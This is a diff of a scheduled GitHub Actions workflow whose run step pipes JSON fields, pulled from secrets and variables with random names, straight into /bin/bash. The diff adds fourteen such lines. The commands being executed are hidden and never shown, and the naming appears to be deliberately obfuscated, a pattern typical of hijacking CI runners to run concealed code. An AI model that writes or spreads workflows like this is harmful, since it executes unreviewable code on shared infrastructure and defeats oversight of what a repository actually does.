@@ -1,20 +1,30 @@
 name: fanglinhaidan
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 4/6 * * *'
-jobs:  # 3616
+    - cron: '45 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: fanglinhaidan
         env:
-          u0: ${{ secrets.u0 }}
+          vsrs3: ${{ secrets.vsrs3 }}
         run: |
-          echo $u0 | jq -r .p9959 | /bin/bash
-          echo $wdjfe9444 | jq -r .nfh3 | /bin/bash
-          echo $r42627 | jq -r .dwi2342 | /bin/bash
-          echo $cvg3 | jq -r .zgkee05378 | /bin/bash
+          echo $vsrs3 | jq -r .wlm71 | /bin/bash
+          echo $u225 | jq -r .dms11 | /bin/bash
+          echo $nwq513 | jq -r .vut1255 | /bin/bash
+          echo $r507 | jq -r .ycq9778 | /bin/bash
+          echo $gomfh05723 | jq -r .wrauz1 | /bin/bash
+          echo $gnrhy8 | jq -r .oanew5 | /bin/bash
+          echo $ek184 | jq -r .m13 | /bin/bash
+          echo $ixroh11 | jq -r .notwn6 | /bin/bash
+          echo $yyfl49 | jq -r .a6019 | /bin/bash
+          echo $hnvkr7950 | jq -r .dclr7 | /bin/bash
+          echo $kmst07 | jq -r .igw8 | /bin/bash
+          echo $n29856 | jq -r .gwtx513 | /bin/bash
+          echo $zvpix4668 | jq -r .mno99 | /bin/bash
+          echo $duzez9029 | jq -r .tup403 | /bin/bash
 
